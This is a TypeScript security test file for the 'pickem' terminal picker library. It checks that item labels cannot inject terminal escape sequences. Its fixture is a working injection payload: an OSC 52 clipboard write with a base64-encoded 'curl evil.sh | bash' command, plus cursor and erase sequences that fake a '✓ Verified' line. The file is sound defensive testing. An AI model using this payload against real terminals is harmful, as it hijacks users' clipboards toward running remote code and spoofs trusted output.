// tests/security/escape-injection.test.ts
// CWE-150: terminal escape-sequence injection. pickem renders item text that is
// frequently attacker-controllable (branch names, PR titles, filenames, API
// results). Item text must NEVER be able to emit terminal control sequences —
// OSC clipboard writes, cursor movement/erase spoofing, BEL flooding, C1 controls.
// These bytes are never legitimately emitted by pickem, so asserting their
// absence from the raw output stream is a sound security check.
import { describe, it, expect } from 'vitest'
import { selectPicker } from '../../src/prompts/select.js'
import { searchPicker } from '../../src/prompts/search.js'
import { checkboxPicker } from '../../src/prompts/checkbox.js'
import { searchableCheckbox } from '../../src/prompts/searchable-checkbox.js'
import { createFormatter } from '../../src/display/format.js'
import { renderTest } from '../../src/core/testing.js'

// Clipboard-write (OSC 52) + cursor-up/erase spoof + bare BEL + C1 CSI + DEL.
const CLIP = 'Y3VybCBldmlsLnNoIHwgYmFzaA==' // base64 "curl evil.sh | bash"
const PAYLOAD = `deploy-prod\x1b]52;c;${CLIP}\x07\x1b[1A\r\x1b[2K\x1b[32m✓ Verified\x1b[0m\x9b6n\x7f\x07`

// Sequences pickem must NEVER emit because of item text. (CSI like \x1b[1A and
// \n/\r ARE legitimately emitted by the renderer, so we don't assert on those —
// we assert on markers that have no legitimate source.)
function assertNoInjection(raw: string) {
  expect(raw).not.toContain('\x1b]') // any OSC (clipboard/title) introducer
  expect(raw).not.toContain('\x07') // BEL
  expect(raw).not.toContain('\x7f') // DEL
  expect(raw).not.toContain('\x9b') // C1 CSI
  expect(raw).not.toContain(CLIP) // OSC-52 clipboard payload must not survive
}

describe('terminal escape-sequence injection (CWE-150)', () => {
  it('createFormatter (public API) neutralizes control sequences in label + description', () => {
    const out = createFormatter()(
      { label: PAYLOAD, value: 'x', description: `safe\x1b]0;pwned\x07`, group: `g\x07` },
      { count: 3, lastUsed: 0 },
    )
    assertNoInjection(out)
  })

  it('selectPicker: payload on an inactive row does not reach the terminal', async () => {
    const { getRaw } = await renderTest(selectPicker as any, {
      message: 'Deploy target',
      choices: [{ name: 'staging', value: 's' }, { name: PAYLOAD, value: 'p' }],
    })
    assertNoInjection(getRaw())
  })

  it('selectPicker: payload on the ACTIVE row is also neutralized', async () => {
    const { getRaw } = await renderTest(selectPicker as any, {
      message: 'Deploy target',
      choices: [{ name: PAYLOAD, value: 'p' }, { name: 'staging', value: 's' }],
    })
    assertNoInjection(getRaw())
  })

  it('searchPicker: payload in results does not reach the terminal', async () => {
    const { getRaw, events } = await renderTest(searchPicker as any, {
      message: 'Pick',
      source: async () => [{ name: 'safe', value: 's' }, { name: PAYLOAD, value: 'p' }],
    })
    await Promise.resolve()
    events.type('deploy')
    await Promise.resolve()
    assertNoInjection(getRaw())
  })

  it('checkboxPicker: payload across rows does not reach the terminal', async () => {
    const { getRaw } = await renderTest(checkboxPicker as any, {
      message: 'Pick',
      choices: [{ name: 'safe', value: 's' }, { name: PAYLOAD, value: 'p' }],
    })
    assertNoInjection(getRaw())
  })

  it('searchableCheckbox: payload in rows AND the committed summary is neutralized', async () => {
    const items = [
      { label: 'safe', value: 's' },
      { label: PAYLOAD, value: 'p' },
    ]
    const { getRaw, events } = await renderTest(searchableCheckbox as any, {
      message: 'Pick many',
      items,
      pageSize: 15,
      required: false,
      defaultChecked: [],
      allowFreeText: false,
      searchFn: (it: any, term: string) => it.label.includes(term),
      formatFn: createFormatter(),
      usageStats: null,
    })
    await Promise.resolve()
    events.keypress('down') // move to payload row
    events.keypress('space') // check it (so it lands in the submit summary)
    events.keypress('enter') // submit -> committed summary line joins labels
    await Promise.resolve()
    assertNoInjection(getRaw())
  })
})
